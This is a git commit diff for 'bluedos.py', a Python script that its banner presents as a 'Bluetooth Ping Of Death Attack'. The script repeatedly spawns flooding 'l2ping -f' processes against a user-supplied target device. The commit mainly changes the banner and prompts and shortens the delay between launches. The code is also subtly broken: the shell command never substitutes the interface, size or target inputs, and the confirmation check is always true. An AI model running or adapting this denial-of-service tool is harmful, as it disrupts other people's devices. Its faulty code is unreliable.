6fd9671e9cf727648e880d1757c5aebcaa187157
otx2s <47149411+otx2s@users.noreply.github.com>
2019-03-08 15:47:50 +0700

    update

--- bluedos.py
+++ bluedos.py
@@ -13,40 +13,41 @@ G = "\033[92m"
 Y = "\033[93m" 
 W = "\033[0m"
 BOLD = "\033[1m"
+POD = "\033[4m"
 
-banner = R+"""
- ▄▄▄▄    ██▓     █    ██ ▓█████▄▄▄█████▓ ▒█████   ▒█████  ▄▄▄█████▓ ██░ ██ 
-▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██░ ██▒
-▒██▒ ▄██▒██░    ▓██  ▒██░▒███  ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▒██▀▀██░
-▒██░█▀  ▒██░    ▓▓█  ░██░▒▓█  ▄░ ▓██▓ ░ ▒██   ██░▒██   ██░░ ▓██▓ ░ ░▓█ ░██ 
-░▓█  ▀█▓░██████▒▒▒█████▓ ░▒████▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ░▓█▒░██▓
-░▒▓███▀▒░ ▒░▓  ░░▒▓▒ ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░    ▒ ░░▒░▒
-▒░▒   ░ ░ ░ ▒  ░░░▒░ ░ ░  ░ ░  ░   ░      ░ ▒ ▒░   ░ ▒ ▒░     ░     ▒ ░▒░ ░
- ░    ░   ░ ░    ░░░ ░ ░    ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░       ░  ░░ ░
- ░          ░  ░   ░        ░  ░            ░ ░      ░ ░            ░  ░  ░
-      ░                                                                    
-"""+G+"""Author"""+W+""": otx2s
-"""+G+"""Github"""+W+""": https://github.com/otx2s
-"""+G+"""Version"""+W+""": 1.0
+banner = R+BOLD+r"""
+██████╗ ██╗     ██╗   ██╗███████╗██████╗  ██████╗ ███████╗
+██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗██╔═══██╗██╔════╝
+██████╔╝██║     ██║   ██║█████╗  ██║  ██║██║   ██║███████╗
+██╔══██╗██║     ██║   ██║██╔══╝  ██║  ██║██║   ██║╚════██║
+██████╔╝███████╗╚██████╔╝███████╗██████╔╝╚██████╔╝███████║
+╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚══════╝
+                                                          
+"""+G+BOLD+"""Author"""+W+""": otx2s
+"""+G+BOLD+"""Github"""+W+""": https://github.com/otx2s
+"""+G+BOLD+"""Version"""+W+""": 1.0
 """+W
 
 def main():
     try:
         print(banner)
-        inter = input(B+"INTERFACE"+W+" (default: hci0) > ") or "hci0"
-        tar = input(B+"TARGET"+W+" > ")
-        size = int(input(B+"SIZE"+W+" (default: 600) > ") or 600)
+        inter = input(B+POD+"INTERFACE"+W+" (default: hci0) > ") or "hci0"
+        tar = input(B+POD+"TARGET"+W+" > ")
+        size = int(input(B+POD+"SIZE"+W+" (default: 600) > ") or 600)
         print(G+"-"*30+W)
         start = input("Do you want to start: (Y/n) ")
         if start == 'y' or 'Y':
             print(G+"\n[+]"+W+" Bluetooth Ping Of Death Attack Started ...")
+            ts(1)
+            print(G+"[+]"+W+" Sending packets to the victim. Be patient!")
             try:
                 for i in range(1, 10000):
                     xterm_1 = "l2ping -i inter -s size -f tar &"
                     subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                    ts(3)
+                    ts(2)
             except(KeyboardInterrupt, OSError):
-                print(R+"[-]"+W+" Something Is Wrong!")
+                print(R+"[-]"+W+" Try again!")
+                ts(2)
                 main()
         elif start == 'n' or 'N':
             print("\n[*] Exiting...")
